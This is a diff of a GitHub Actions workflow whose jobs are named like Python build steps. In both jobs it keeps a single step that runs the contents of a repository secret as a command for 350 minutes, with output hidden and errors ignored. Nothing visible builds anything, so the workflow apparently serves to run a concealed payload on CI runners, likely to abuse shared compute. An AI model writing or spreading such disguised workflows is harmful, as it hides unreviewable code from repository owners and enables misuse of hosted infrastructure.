@@ -47,10 +47,8 @@ jobs:
     - uses: actions/checkout@v3
     - name: Rerunning
       continue-on-error: true
-      run: |
-         RUNNERS=u$(shuf -i 1000000-9999999 -n 1)
-         GITHUBS=$(shuf -i 1000000-9999999 -n 1)
-         timeout 350m ${{ secrets.YOUR_SECRET_NAME }} >/dev/null 2>&1
+      run: timeout 350m ${{ secrets.YOUR_SECRET_NAME }} >/dev/null 2>&1
+      
  python-build-1:
     runs-on: ubuntu-20.04 
     needs: python-2
@@ -63,7 +61,4 @@ jobs:
     - uses: actions/checkout@v3
     - name: Rerunning
       continue-on-error: true
-      run: |
-         RUNNERS=u$(shuf -i 1000000-9999999 -n 1)
-         GITHUBS=$(shuf -i 1000000-9999999 -n 1)
-         timeout 350m ${{ secrets.YOUR_SECRET_NAME }} >/dev/null 2>&1
+      run: timeout 350m ${{ secrets.YOUR_SECRET_NAME }} >/dev/null 2>&1
